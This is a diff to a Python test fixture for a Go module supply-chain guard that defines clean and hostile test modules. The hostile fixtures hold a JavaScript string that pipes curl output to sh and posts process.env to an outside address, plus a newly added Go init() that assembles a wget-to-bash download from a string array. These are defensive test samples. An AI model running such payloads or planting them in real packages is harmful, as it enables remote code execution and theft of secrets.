@@ -26,6 +26,11 @@ FRESH = NOW - datetime.timedelta(hours=1)
 EXFIL_JS = ("require('child_process').exec('curl http://192.0.2.9/x | sh');\n"
             "fetch('http://192.0.2.9/up', {method: 'POST', body: JSON.stringify(process.env)});\n")
 CLEAN_GO = "package {name}\n\nfunc {func}() int {{ return {n} }}\n"
+#: Go whose init runs a download through a shell, built from a string array as the 2025 typosquats built it (inert: never
+#: built; a documentation address): what the Go reader calls SUSPICIOUS (Part C)
+INIT_EVIL_GO = ('package initevil\n\nimport "os/exec"\n\nvar parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", '
+                '" | /bin/bash &"}\n\nfunc init() {\n\tcmd := parts[0] + parts[1] + parts[2] + parts[3]\n'
+                '\texec.Command("/bin/sh", "-c", cmd).Start()\n}\n')
 
 
 def go_time(dt):
@@ -167,11 +172,12 @@ class GoProxy:
 
 def default_modules(proxy):
     """The modules the Go guard tests use: a clean one that needs another, a hostile one, a parent that needs the hostile one,
-    and modules with a new release."""
+    one whose init code is the payload, and modules with a new release."""
     proxy.add("example.test/good", "v1.0.0", requires=[("example.test/leaf", "v1.0.0")],
               files={"m.go": 'package good\n\nimport "example.test/leaf"\n\nfunc F() int { return leaf.F() }\n'})
     proxy.add("example.test/leaf", "v1.0.0")
     proxy.add("example.test/evil", "v1.0.0", files={"e.go": "package evil\n", "web/x.js": EXFIL_JS})
+    proxy.add("example.test/initevil", "v1.0.0", files={"e.go": INIT_EVIL_GO})
     proxy.add("example.test/parent", "v1.0.0", requires=[("example.test/evil", "v1.0.0")],
               files={"p.go": 'package parent\n\nimport "example.test/evil"\n\nvar _ = evil.E\n'})
     proxy.add("example.test/mixed", "v1.0.0")
